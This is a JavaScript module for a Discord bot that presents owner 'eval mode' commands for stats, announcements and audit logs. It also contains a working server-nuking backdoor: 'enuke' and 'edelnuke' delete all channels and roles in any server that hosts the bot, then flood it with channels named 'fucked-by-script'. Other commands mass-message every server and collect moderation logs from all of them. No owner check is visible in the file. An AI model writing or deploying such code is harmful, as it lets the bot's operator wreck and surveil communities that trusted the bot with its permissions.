const { EmbedBuilder, AuditLogEvent } = require('discord.js');
const os = require('os');
const AcknowledgementService = require('./acknowledgementService');
const database = require('./database');

class EvalMode {
    constructor() {
        this.evalModeUsers = new Set();
        this.ackService = new AcknowledgementService();
    }

    isInEvalMode(userId) {
        return this.evalModeUsers.has(userId);
    }

    enterEvalMode(userId) {
        this.evalModeUsers.add(userId);
    }

    exitEvalMode(userId) {
        this.evalModeUsers.delete(userId);
    }

    async handleEvalCommand(message, client, command, args) {
        const userId = message.author.id;

        if (command === 'eval') {
            if (this.isInEvalMode(userId)) {
                this.exitEvalMode(userId);
                await this.ackService.send(
                    message,
                    '🔓 **Eval Mode Deactivated**\n\nYou have exited eval mode successfully.\n**Status:** ❌ Eval mode disabled'
                );
                return;
            } else {
                this.enterEvalMode(userId);
                await this.ackService.send(
                    message,
                    '🔐 **Eval Mode Activated**\n\n**⚠️ OWNER MODE ENABLED**\n\nYou now have access to eval mode commands.\n\n**Available Commands:**\n• `ehelp` or `!ehelp` - View all eval commands\n• `eexit` or `!eexit` - Exit eval mode\n\n**Status:** ✅ Eval mode active'
                );
                return;
            }
        }

        if (command === 'eexit') {
            if (this.isInEvalMode(userId)) {
                this.exitEvalMode(userId);
                await this.ackService.send(
                    message,
                    '🔓 **Eval Mode Deactivated**\n\nYou have exited eval mode successfully.\n**Status:** ❌ Eval mode disabled'
                );
            } else {
                await this.ackService.send(
                    message,
                    '❌ **Not in Eval Mode**\n\nYou are not currently in eval mode.\nUse `eval` or `!eval` to enter eval mode.'
                );
            }
            return;
        }

        if (!this.isInEvalMode(userId)) {
            await this.ackService.send(
                message,
                '❌ **Eval Mode Required**\n\nYou must be in eval mode to use this command.\nUse `eval` or `!eval` to enter eval mode.'
            );
            return;
        }

        switch (command) {
            case 'ehelp':
                return this.showHelp(message);

            case 'eram':
                return this.showHostingDetails(message);

            case 'estats':
                return this.showBotStats(message, client);

            case 'eannoc':
                return this.globalAnnounce(message, client, args);

            case 'eusers':
                return this.showServerCount(message, client);

            case 'enuke':
                return this.nukeServer(message, client, args);

            case 'edelnuke':
                return this.deleteNukeChannels(message, client, args);

            case 'elogs':
                return this.showServerLogs(message, client, args);

            case 'eloggings':
                return this.setupLoggingChannel(message, args);

            case 'elogsbot':
                return this.showAllBotLogs(message, client);

            default:
                await this.ackService.send(
                    message,
                    '❌ **Unknown Command**\n\nUnknown eval command. Use `ehelp` to see available commands.'
                );
                return;
        }
    }

    async showHelp(message) {
        await this.ackService.send(
            message,
            `🔐 **Eval Mode Commands**\n\n**Owner-Only Commands**\nAll commands can be used with or without the \`!\` prefix.\n\n**📊 Information Commands:**\n• \`eram\` - View hosting and system details\n• \`estats\` - View bot statistics and performance\n• \`eusers\` - Show server count and user statistics\n\n**📋 Logging Commands:**\n• \`elogs\` - Show current server audit logs\n• \`elogs "bans"\` | \`"timeouts"\` | \`"kicks"\` - Filter logs by type\n  **Example:** \`elogs "bans"\`\n• \`eloggings "channel_id"\` - Setup logging channel for server\n  **Example:** \`eloggings "1234567890123456789"\`\n• \`elogsbot\` - Show all bot logs across all servers\n\n**🚨 Administrative Commands:**\n• \`enuke "server_id" "custom name"\` - Nuke ONLY the specified server\n  **Example:** \`enuke "1234567890" "fucked by script"\`\n• \`edelnuke "server_id"\` - Delete ALL channels in specified server\n  **Example:** \`edelnuke "1234567890"\`\n• \`eannoc <message_id>\` - Announce message to all servers\n\n**🛠️ System Commands:**\n• \`ehelp\` or \`!ehelp\` - Show this help menu\n• \`eval\` - Toggle eval mode on/off\n• \`eexit\` or \`!eexit\` - Exit eval mode`
        );
    }

    async showHostingDetails(message) {
        const uptime = process.uptime();
        const days = Math.floor(uptime / 86400);
        const hours = Math.floor((uptime % 86400) / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = Math.floor(uptime % 60);

        const totalMemory = os.totalmem();
        const freeMemory = os.freemem();
        const usedMemory = totalMemory - freeMemory;
        const memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2);

        const cpus = os.cpus();
        const cpuModel = cpus[0].model;
        const cpuCores = cpus.length;

        await this.ackService.send(
            message,
            `💻 **Hosting Details**\n\n**System and Resource Information**\n\n**⏱️ Uptime:** ${days}d ${hours}h ${minutes}m ${seconds}s\n**🖥️ Platform:** ${os.platform()} (${os.arch()})\n**💾 Memory Usage:** ${(usedMemory / 1024 / 1024 / 1024).toFixed(2)} GB / ${(totalMemory / 1024 / 1024 / 1024).toFixed(2)} GB (${memoryUsagePercent}%)\n**🔧 CPU:** ${cpuModel}\n**Cores:** ${cpuCores}\n**📊 Process Memory:** ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB\n**🌐 Hostname:** ${os.hostname()}\n**📡 Node Version:** ${process.version}`
        );
    }

    async showBotStats(message, client) {
        const totalServers = client.guilds.cache.size;
        let totalMembers = 0;
        let totalChannels = 0;
        let totalRoles = 0;

        client.guilds.cache.forEach(guild => {
            totalMembers += guild.memberCount;
            totalChannels += guild.channels.cache.size;
            totalRoles += guild.roles.cache.size;
        });

        const uptime = process.uptime();
        const days = Math.floor(uptime / 86400);
        const hours = Math.floor((uptime % 86400) / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);

        const memoryUsage = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
        const ping = client.ws.ping;

        await this.ackService.send(
            message,
            `📊 **Bot Statistics**\n\n**Comprehensive Bot Performance Data**\n\n**🌐 Servers:** ${totalServers.toLocaleString()}\n**👥 Total Users:** ${totalMembers.toLocaleString()}\n**📡 Ping:** ${ping}ms\n**💬 Channels:** ${totalChannels.toLocaleString()}\n**🎭 Roles:** ${totalRoles.toLocaleString()}\n**💾 Memory:** ${memoryUsage} MB\n**⏱️ Uptime:** ${days}d ${hours}h ${minutes}m\n**🤖 Bot User:** ${client.user.tag}\n**🆔 Bot ID:** ${client.user.id}`
        );
    }

    async showServerCount(message, client) {
        const totalServers = client.guilds.cache.size;
        let totalMembers = 0;

        const serverList = [];
        client.guilds.cache.forEach(guild => {
            totalMembers += guild.memberCount;
            serverList.push({
                name: guild.name,
                members: guild.memberCount,
                id: guild.id
            });
        });

        serverList.sort((a, b) => b.members - a.members);

        const top10Servers = serverList.slice(0, 10).map((server, index) => {
            return `**${index + 1}.** ${server.name} - ${server.members.toLocaleString()} members\n\`ID: ${server.id}\``;
        }).join('\n\n');

        await this.ackService.send(
            message,
            `📊 **Server & User Statistics**\n\n**Detailed Server Usage Information**\n\n**🌐 Total Servers:** ${totalServers.toLocaleString()} servers\n**👥 Total Users:** ${totalMembers.toLocaleString()} users\n**📈 Average Server Size:** ${Math.floor(totalMembers / totalServers).toLocaleString()} users/server\n\n**🏆 Top 10 Servers by Members:**\n${top10Servers || 'No servers'}`
        );
    }

    async globalAnnounce(message, client, args) {
        const messageId = args[0];
        if (!messageId) {
            await this.ackService.send(
                message,
                '❌ **Missing Message ID**\n\nPlease provide a message ID to announce globally.\n**Usage:** `eannoc <message_id>`'
            );
            return;
        }

        try {
            const announceMessage = await message.channel.messages.fetch(messageId);
            if (!announceMessage) {
                await this.ackService.send(
                    message,
                    '❌ **Message Not Found**\n\nMessage not found. Make sure the message is in this channel.'
                );
                return;
            }

            const commonChannelNames = [
                'general', 'chat', 'general-chat', 'main', 'main-chat',
                'lobby', 'community', 'discussion', 'talk', 'chats',
                'announcements', 'announce', 'news', 'updates'
            ];

            let totalServers = 0;
            let successCount = 0;
            let failCount = 0;

            const statusMsg = await this.ackService.send(
                message,
                '📢 **Starting Global Announcement**\n\nProcessing announcement to all servers...'
            );

            const announceEmbed = new EmbedBuilder()
                .setColor('#C8A2C8')
                .setTitle('📢 Global Announcement')
                .setDescription(announceMessage.content || 'Announcement from bot owner')
                .setFooter({ text: `Sent by ${message.author.username}` })
                .setTimestamp();

            for (const [guildId, guild] of client.guilds.cache) {
                totalServers++;
                let messageSent = false;

                for (const channelName of commonChannelNames) {
                    const targetChannel = guild.channels.cache.find(ch =>
                        ch.name.toLowerCase().includes(channelName) &&
                        ch.isTextBased() &&
                        ch.permissionsFor(guild.members.me)?.has('SendMessages')
                    );

                    if (targetChannel) {
                        try {
                            await targetChannel.send({ embeds: [announceEmbed] });
                            successCount++;
                            messageSent = true;
                            console.log(`✅ Announced in ${guild.name} - #${targetChannel.name}`);
                            break;
                        } catch (error) {
                            console.error(`❌ Failed to announce in ${guild.name}:`, error.message);
                        }
                    }
                }

                if (!messageSent) {
                    failCount++;
                    console.log(`❌ No suitable channel found in ${guild.name}`);
                }

                if (totalServers % 10 === 0) {
                    await statusMsg.edit({
                        embeds: [
                            new EmbedBuilder()
                                .setColor('#C8A2C8')
                                .setDescription(`**Time:** <t:${Math.floor(Date.now() / 1000)}:T>\n**Executed by:** <@${message.author.id}>\n📢 **Progress:** ${successCount}/${totalServers} servers announced...`)
                                .setThumbnail(this.ackService.imageURL)
                        ]
                    });
                }
            }

            await statusMsg.edit({
                embeds: [
                    new EmbedBuilder()
                        .setColor('#C8A2C8')
                        .setDescription(`**Time:** <t:${Math.floor(Date.now() / 1000)}:T>\n**Executed by:** <@${message.author.id}>\n✅ **Global Announcement Complete**\n\n**Announcement sent to all servers**\n\n**📊 Total Servers:** ${totalServers}\n**✅ Success:** ${successCount}\n**❌ Failed:** ${failCount}\n**📈 Success Rate:** ${((successCount / totalServers) * 100).toFixed(2)}%`)
                        .setThumbnail(this.ackService.imageURL)
                ]
            });

        } catch (error) {
            console.error('Error in global announce:', error);
            await this.ackService.send(
                message,
                '❌ **Error**\n\nAn error occurred while sending the global announcement.'
            );
        }
    }

    async nukeServer(message, client, args) {
        const fullArgs = args.join(' ');
        const matches = fullArgs.match(/"([^"]+)"|(\S+)/g);
        
        if (!matches || matches.length < 1) {
            await this.ackService.send(
                message,
                '❌ **Missing Parameters**\n\nPlease provide server ID and optional custom channel name.\n**Usage:** `enuke "server_id" "custom name"`\n**Example:** `enuke "1234567890" "fucked by script"`'
            );
            return;
        }

        const serverId = matches[0].replace(/"/g, '');
        const customChannelName = matches[1] ? matches[1].replace(/"/g, '') : 'fucked-by-script';

        if (!serverId) {
            await this.ackService.send(
                message,
                '❌ **Missing Server ID**\n\nPlease provide a valid server ID.\n**Usage:** `enuke "server_id" "custom name"`'
            );
            return;
        }

        try {
            const targetGuild = client.guilds.cache.get(serverId);
            
            if (!targetGuild) {
                await this.ackService.send(
                    message,
                    `❌ **Server Not Found**\n\nServer with ID \`${serverId}\` not found.\n\n**Possible reasons:**\n• Bot is not in that server\n• Server ID is incorrect\n• Server does not exist\n\nPlease verify the server ID and try again.`
                );
                return;
            }

            const sanitizedChannelName = customChannelName.toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9-]/g, '');

            await this.ackService.send(
                message,
                `⚠️ **Server Nuke Confirmation**\n\n**ARE YOU ABSOLUTELY SURE?**\n\nThis will nuke ONLY the following server:\n\n**🌐 Server Name:** ${targetGuild.name}\n**🆔 Server ID:** \`${targetGuild.id}\`\n**👥 Members:** ${targetGuild.memberCount.toLocaleString()}\n**📛 New Channel Name:** "${sanitizedChannelName}"\n\n**⚠️ WARNING:**\nThis action will:\n• Delete ALL channels in this server ONLY\n• Delete ALL roles in this server ONLY\n• Create 20-30 channels with name: "${sanitizedChannelName}"\n• **CANNOT BE UNDONE**\n• Will NOT affect any other servers\n\n**Reply with "CONFIRM" to proceed or "CANCEL" to abort**`
            );

            const filter = m => m.author.id === message.author.id;
            const collected = await message.channel.awaitMessages({ filter, max: 1, time: 30000, errors: ['time'] })
                .catch(() => null);

            if (!collected || !collected.first()) {
                await this.ackService.send(
                    message,
                    '❌ **Nuke Cancelled**\n\nNuke operation cancelled due to timeout.'
                );
                return;
            }

            const response = collected.first().content.toUpperCase();

            if (response !== 'CONFIRM') {
                await this.ackService.send(
                    message,
                    '❌ **Nuke Cancelled**\n\nNuke operation cancelled by user.'
                );
                return;
            }

            console.log(`🚨 NUKE INITIATED - Server: ${targetGuild.name} (${targetGuild.id}) - Custom channel name: ${sanitizedChannelName}`);

            const processingMsg = await this.ackService.send(
                message,
                `🚨 **NUKING SERVER...**\n\n**Target:** ${targetGuild.name} (ID: \`${targetGuild.id}\`)\n\nDeleting all channels and roles...\nThis may take a while.`
            );

            let deletedChannels = 0;
            let deletedRoles = 0;

            const channelsToDelete = Array.from(targetGuild.channels.cache.values());
            for (const channel of channelsToDelete) {
                try {
                    await channel.delete('Nuked by script - Owner command');
                    deletedChannels++;
                    console.log(`✅ Deleted channel: ${channel.name} from ${targetGuild.name}`);
                } catch (error) {
                    console.error(`❌ Failed to delete channel ${channel.name} in ${targetGuild.name}:`, error.message);
                }
            }

            const rolesToDelete = Array.from(targetGuild.roles.cache.values());
            for (const role of rolesToDelete) {
                if (role.managed || role.id === targetGuild.id) continue;
                try {
                    await role.delete('Nuked by script - Owner command');
                    deletedRoles++;
                    console.log(`✅ Deleted role: ${role.name} from ${targetGuild.name}`);
                } catch (error) {
                    console.error(`❌ Failed to delete role ${role.name} in ${targetGuild.name}:`, error.message);
                }
            }

            const numChannels = Math.floor(Math.random() * 11) + 20;
            let createdChannels = 0;

            for (let i = 0; i < numChannels; i++) {
                try {
                    await targetGuild.channels.create({
                        name: sanitizedChannelName,
                        type: 0,
                        reason: `Server nuked by script - Custom name: ${customChannelName}`
                    });
                    createdChannels++;
                    console.log(`✅ Created channel ${i + 1}/${numChannels}: ${sanitizedChannelName} in ${targetGuild.name}`);
                } catch (error) {
                    console.error(`❌ Failed to create channel ${i + 1} in ${targetGuild.name}:`, error.message);
                }
            }

            try {
                const firstChannel = targetGuild.channels.cache.first();
                if (firstChannel && firstChannel.isTextBased()) {
                    const nukedEmbed = new EmbedBuilder()
                        .setColor('#8B0000')
                        .setTitle('💥 SERVER NUKED')
                        .setDescription(`**This server has been nuked by script**\n\n**Channel Name:** ${sanitizedChannelName}`)
                        .addFields(
                            { name: 'Nuked By', value: message.author.username, inline: true },
                            { name: 'Timestamp', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true }
                        )
                        .setTimestamp();

                    await firstChannel.send({ embeds: [nukedEmbed] });
                    console.log(`✅ Sent nuke notification in ${targetGuild.name}`);
                }
            } catch (error) {
                console.error(`❌ Failed to send nuke notification in ${targetGuild.name}:`, error.message);
            }

            console.log(`🎉 NUKE COMPLETED - Server: ${targetGuild.name} (${targetGuild.id})`);

            await processingMsg.edit({
                embeds: [
                    new EmbedBuilder()
                        .setColor('#C8A2C8')
                        .setDescription(`**Time:** <t:${Math.floor(Date.now() / 1000)}:T>\n**Executed by:** <@${message.author.id}>\n✅ **Server Nuked Successfully**\n\n**Nuke operation completed for ONLY the specified server**\n\n**🌐 Server:** ${targetGuild.name}\n**🆔 Server ID:** \`${targetGuild.id}\`\n**💬 Channels Deleted:** ${deletedChannels}\n**🎭 Roles Deleted:** ${deletedRoles}\n**📢 Channels Created:** ${createdChannels}\n**📛 Channel Names:** "${sanitizedChannelName}"\n\n**✅ Only this server was affected - no other servers touched**`)
                        .setThumbnail(this.ackService.imageURL)
                ]
            });

        } catch (error) {
            console.error('Error in server nuke:', error);
            await this.ackService.send(
                message,
                '❌ **Error**\n\nAn error occurred while nuking the server.'
            );
        }
    }

    async deleteNukeChannels(message, client, args) {
        const fullArgs = args.join(' ');
        const matches = fullArgs.match(/"([^"]+)"|(\S+)/g);

        if (!matches || matches.length < 1) {
            await this.ackService.send(
                message,
                '❌ **Missing Server ID**\n\nPlease provide a server ID to delete all channels.\n**Usage:** `edelnuke "server_id"`\n**Example:** `edelnuke "1234567890"`'
            );
            return;
        }

        const serverId = matches[0].replace(/"/g, '');

        if (!serverId) {
            await this.ackService.send(
                message,
                '❌ **Missing Server ID**\n\nPlease provide a valid server ID.\n**Usage:** `edelnuke "server_id"`'
            );
            return;
        }

        try {
            const targetGuild = client.guilds.cache.get(serverId);
            
            if (!targetGuild) {
                await this.ackService.send(
                    message,
                    `❌ **Server Not Found**\n\nServer with ID \`${serverId}\` not found.\n\n**Possible reasons:**\n• Bot is not in that server\n• Server ID is incorrect\n• Server does not exist\n\nPlease verify the server ID and try again.`
                );
                return;
            }

            const totalChannels = targetGuild.channels.cache.size;

            await this.ackService.send(
                message,
                `⚠️ **Delete All Channels Confirmation**\n\n**ARE YOU ABSOLUTELY SURE?**\n\nThis will delete ALL channels in ONLY the following server:\n\n**🌐 Server Name:** ${targetGuild.name}\n**🆔 Server ID:** \`${targetGuild.id}\`\n**👥 Members:** ${targetGuild.memberCount.toLocaleString()}\n**📊 Total Channels:** ${totalChannels} channels\n\n**⚠️ WARNING:**\nThis action will:\n• Delete ALL ${totalChannels} channels in this server\n• Delete text, voice, category, and all other channel types\n• **CANNOT BE UNDONE**\n• Will NOT affect any other servers\n• Will NOT delete roles\n• Will NOT create new channels\n\n**Reply with "CONFIRM" to proceed or "CANCEL" to abort**`
            );

            const filter = m => m.author.id === message.author.id;
            const collected = await message.channel.awaitMessages({ filter, max: 1, time: 30000, errors: ['time'] })
                .catch(() => null);

            if (!collected || !collected.first()) {
                await this.ackService.send(
                    message,
                    '❌ **Deletion Cancelled**\n\nChannel deletion cancelled due to timeout.'
                );
                return;
            }

            const response = collected.first().content.toUpperCase();

            if (response !== 'CONFIRM') {
                await this.ackService.send(
                    message,
                    '❌ **Deletion Cancelled**\n\nChannel deletion cancelled by user.'
                );
                return;
            }

            console.log(`🗑️ MASS CHANNEL DELETION INITIATED - Server: ${targetGuild.name} (${targetGuild.id})`);

            const processingMsg = await this.ackService.send(
                message,
                `🗑️ **Deleting All Channels...**\n\n**Target:** ${targetGuild.name} (ID: \`${targetGuild.id}\`)\n\nDeleting all ${totalChannels} channels...\nThis may take a while.`
            );

            let deletedCount = 0;
            let failedCount = 0;

            const channelsToDelete = Array.from(targetGuild.channels.cache.values());
            
            for (const channel of channelsToDelete) {
                try {
                    await channel.delete('Mass deletion - Delete all channels - Owner command');
                    deletedCount++;
                    console.log(`✅ Deleted channel: ${channel.name} (${channel.type}) from ${targetGuild.name}`);
                } catch (error) {
                    failedCount++;
                    console.error(`❌ Failed to delete channel ${channel.name} from ${targetGuild.name}:`, error.message);
                }
            }

            console.log(`🎉 MASS CHANNEL DELETION COMPLETED - Server: ${targetGuild.name} (${targetGuild.id}) - Deleted: ${deletedCount}, Failed: ${failedCount}`);

            await processingMsg.edit({
                embeds: [
                    new EmbedBuilder()
                        .setColor('#C8A2C8')
                        .setDescription(`**Time:** <t:${Math.floor(Date.now() / 1000)}:T>\n**Executed by:** <@${message.author.id}>\n✅ **All Channels Deleted Successfully**\n\n**Mass deletion completed for ONLY the specified server**\n\n**🌐 Server:** ${targetGuild.name}\n**🆔 Server ID:** \`${targetGuild.id}\`\n**📊 Total Channels:** ${totalChannels}\n**✅ Deleted:** ${deletedCount}\n**❌ Failed:** ${failedCount}\n**📈 Success Rate:** ${((deletedCount / totalChannels) * 100).toFixed(2)}%\n\n**✅ Only this server was affected - no other servers touched**\n**ℹ️ Roles were NOT deleted**`)
                        .setThumbnail(this.ackService.imageURL)
                ]
            });

        } catch (error) {
            console.error('Error in delete all channels:', error);
            await this.ackService.send(
                message,
                '❌ **Error**\n\nAn error occurred while deleting all channels.'
            );
        }
    }

    async showServerLogs(message, client, args) {
        const guildId = message.guild?.id;
        
        if (!guildId) {
            await this.ackService.send(
                message,
                '❌ **Server Required**\n\nThis command must be used in a server, not in DMs.'
            );
            return;
        }

        let logType = null;
        if (args.length > 0) {
            const filter = args[0].toLowerCase().replace(/"/g, '');
            const validTypes = ['bans', 'timeouts', 'kicks'];
            
            if (!validTypes.includes(filter)) {
                await this.ackService.send(
                    message,
                    `❌ **Invalid Filter**\n\nInvalid log type. Valid types are: \`bans\`, \`timeouts\`, \`kicks\`\n**Usage:** \`elogs "bans"\` or \`elogs "kicks"\``
                );
                return;
            }
            
            logType = filter.slice(0, -1);
        }

        try {
            const guild = client.guilds.cache.get(guildId);
            if (!guild) {
                await this.ackService.send(
                    message,
                    '❌ **Server Not Found**\n\nCould not find the server.'
                );
                return;
            }

            const processingMsg = await this.ackService.send(
                message,
                '📋 **Fetching Audit Logs...**\n\nRetrieving server audit logs from Discord...'
            );

            const auditLogs = await guild.fetchAuditLogs({ limit: 50 });
            
            let filteredLogs = Array.from(auditLogs.entries.values());
            
            if (logType) {
                const actionMap = {
                    'ban': AuditLogEvent.MemberBanAdd,
                    'timeout': AuditLogEvent.MemberUpdate,
                    'kick': AuditLogEvent.MemberKick
                };
                
                const targetAction = actionMap[logType];
                filteredLogs = filteredLogs.filter(log => {
                    if (logType === 'timeout') {
                        return log.action === targetAction && 
                               log.changes?.some(change => change.key === 'communication_disabled_until');
                    }
                    return log.action === targetAction;
                });
            } else {
                filteredLogs = filteredLogs.filter(log => 
                    log.action === AuditLogEvent.MemberBanAdd ||
                    log.action === AuditLogEvent.MemberKick ||
                    (log.action === AuditLogEvent.MemberUpdate && 
                     log.changes?.some(change => change.key === 'communication_disabled_until'))
                );
            }

            const recentLogs = filteredLogs.slice(0, 20);

            if (recentLogs.length === 0) {
                await processingMsg.edit({
                    embeds: [
                        new EmbedBuilder()
                            .setColor('#C8A2C8')
                            .setDescription(`**Time:** <t:${Math.floor(Date.now() / 1000)}:T>\n**Executed by:** <@${message.author.id}>\n📋 **Server Audit Logs**\n\n**No ${logType ? logType + 's' : 'moderation'} logs found in this server.**\n\n**Server:** ${guild.name}\n**Server ID:** \`${guild.id}\``)
                            .setThumbnail(this.ackService.imageURL)
                    ]
                });
                return;
            }

            const logEntries = recentLogs.map((log, index) => {
                const executor = log.executor ? `<@${log.executor.id}>` : 'Unknown';
                const target = log.target ? `<@${log.target.id}>` : 'Unknown';
                const reason = log.reason || 'No reason provided';
                
                let actionType = '❓ Unknown';
                if (log.action === AuditLogEvent.MemberBanAdd) actionType = '🔨 Ban';
                else if (log.action === AuditLogEvent.MemberKick) actionType = '👢 Kick';
                else if (log.action === AuditLogEvent.MemberUpdate) actionType = '⏱️ Timeout';
                
                const timestamp = `<t:${Math.floor(log.createdTimestamp / 1000)}:R>`;
                
                return `**${index + 1}. ${actionType}**\n**Target:** ${target}\n**Moderator:** ${executor}\n**Reason:** ${reason}\n**When:** ${timestamp}`;
            }).join('\n\n');

            const filterText = logType ? ` (${logType}s only)` : '';

            await processingMsg.edit({
                embeds: [
                    new EmbedBuilder()
                        .setColor('#C8A2C8')
                        .setDescription(`**Time:** <t:${Math.floor(Date.now() / 1000)}:T>\n**Executed by:** <@${message.author.id}>\n📋 **Server Audit Logs${filterText}**\n\n**Server:** ${guild.name}\n**Total Logs:** ${recentLogs.length}\n\n${logEntries}`)
                        .setThumbnail(this.ackService.imageURL)
                ]
            });

        } catch (error) {
            console.error('Error fetching server logs:', error);
            await this.ackService.send(
                message,
                '❌ **Error**\n\nAn error occurred while fetching audit logs. Make sure the bot has permission to view audit logs.'
            );
        }
    }

    async setupLoggingChannel(message, args) {
        const guildId = message.guild?.id;
        
        if (!guildId) {
            await this.ackService.send(
                message,
                '❌ **Server Required**\n\nThis command must be used in a server, not in DMs.'
            );
            return;
        }

        if (args.length === 0) {
            await this.ackService.send(
                message,
                '❌ **Missing Channel ID**\n\nPlease provide a channel ID to setup logging.\n**Usage:** `eloggings "channel_id"`\n**Example:** `eloggings "1234567890123456789"`'
            );
            return;
        }

        const channelId = args[0].replace(/"/g, '');

        if (!channelId || !/^\d+$/.test(channelId)) {
            await this.ackService.send(
                message,
                '❌ **Invalid Channel ID**\n\nPlease provide a valid channel ID (numbers only).\n**Usage:** `eloggings "channel_id"`'
            );
            return;
        }

        try {
            const channel = message.guild.channels.cache.get(channelId);
            
            if (!channel) {
                await this.ackService.send(
                    message,
                    `❌ **Channel Not Found**\n\nChannel with ID \`${channelId}\` not found in this server.\n\nMake sure:\n• The channel exists in this server\n• The channel ID is correct\n• The bot has access to the channel`
                );
                return;
            }

            if (!channel.isTextBased()) {
                await this.ackService.send(
                    message,
                    '❌ **Invalid Channel Type**\n\nLogging channel must be a text channel.'
                );
                return;
            }

            await database.saveLoggingChannel(guildId, channelId);

            await this.ackService.send(
                message,
                `✅ **Logging Channel Configured**\n\n**Logging channel has been set successfully**\n\n**Server:** ${message.guild.name}\n**Server ID:** \`${guildId}\`\n**Channel:** <#${channelId}>\n**Channel ID:** \`${channelId}\`\n\n**ℹ️ Note:** All audit logs will be sent to this channel when moderation actions occur.`
            );

            try {
                await channel.send({
                    embeds: [
                        new EmbedBuilder()
                            .setColor('#C8A2C8')
                            .setTitle('📋 Logging Channel Configured')
                            .setDescription(`This channel has been set as the logging channel for **${message.guild.name}**.\n\nAll moderation actions (bans, kicks, timeouts) will be logged here.`)
                            .addFields(
                                { name: 'Configured By', value: `<@${message.author.id}>`, inline: true },
                                { name: 'Timestamp', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true }
                            )
                            .setThumbnail(this.ackService.imageURL)
                            .setTimestamp()
                    ]
                });
            } catch (error) {
                console.error('Could not send notification to logging channel:', error);
            }

        } catch (error) {
            console.error('Error setting up logging channel:', error);
            await this.ackService.send(
                message,
                '❌ **Error**\n\nAn error occurred while setting up the logging channel.'
            );
        }
    }

    async showAllBotLogs(message, client) {
        try {
            const processingMsg = await this.ackService.send(
                message,
                '📋 **Fetching All Bot Logs...**\n\nRetrieving logs from all servers...'
            );

            const allGuildLogs = [];
            
            for (const [guildId, guild] of client.guilds.cache) {
                try {
                    const auditLogs = await guild.fetchAuditLogs({ limit: 10 });
                    const filteredLogs = Array.from(auditLogs.entries.values()).filter(log => 
                        log.action === AuditLogEvent.MemberBanAdd ||
                        log.action === AuditLogEvent.MemberKick ||
                        (log.action === AuditLogEvent.MemberUpdate && 
                         log.changes?.some(change => change.key === 'communication_disabled_until'))
                    );
                    
                    if (filteredLogs.length > 0) {
                        allGuildLogs.push({
                            guildId,
                            guildName: guild.name,
                            logs: filteredLogs.slice(0, 5)
                        });
                    }
                } catch (error) {
                    console.error(`Error fetching logs for guild ${guild.name}:`, error.message);
                }
            }

            if (allGuildLogs.length === 0) {
                await processingMsg.edit({
                    embeds: [
                        new EmbedBuilder()
                            .setColor('#C8A2C8')
                            .setDescription(`**Time:** <t:${Math.floor(Date.now() / 1000)}:T>\n**Executed by:** <@${message.author.id}>\n📋 **All Bot Logs**\n\n**No moderation logs found across all servers.**\n\n**Total Servers:** ${client.guilds.cache.size}`)
                            .setThumbnail(this.ackService.imageURL)
                    ]
                });
                return;
            }

            const logSummary = allGuildLogs.map((guildData, index) => {
                const logCount = guildData.logs.length;
                const recentLog = guildData.logs[0];
                
                let actionType = '❓ Unknown';
                if (recentLog.action === AuditLogEvent.MemberBanAdd) actionType = '🔨 Ban';
                else if (recentLog.action === AuditLogEvent.MemberKick) actionType = '👢 Kick';
                else if (recentLog.action === AuditLogEvent.MemberUpdate) actionType = '⏱️ Timeout';
                
                const timestamp = `<t:${Math.floor(recentLog.createdTimestamp / 1000)}:R>`;
                
                return `**${index + 1}. ${guildData.guildName}**\n**Server ID:** \`${guildData.guildId}\`\n**Recent Logs:** ${logCount}\n**Latest:** ${actionType} ${timestamp}`;
            }).join('\n\n');

            const totalLogs = allGuildLogs.reduce((sum, g) => sum + g.logs.length, 0);

            await processingMsg.edit({
                embeds: [
                    new EmbedBuilder()
                        .setColor('#C8A2C8')
                        .setDescription(`**Time:** <t:${Math.floor(Date.now() / 1000)}:T>\n**Executed by:** <@${message.author.id}>\n📋 **All Bot Logs Across Servers**\n\n**Total Servers:** ${client.guilds.cache.size}\n**Servers with Logs:** ${allGuildLogs.length}\n**Total Recent Logs:** ${totalLogs}\n\n${logSummary}`)
                        .setThumbnail(this.ackService.imageURL)
                ]
            });

        } catch (error) {
            console.error('Error fetching all bot logs:', error);
            await this.ackService.send(
                message,
                '❌ **Error**\n\nAn error occurred while fetching bot logs from all servers.'
            );
        }
    }
}

module.exports = EvalMode;
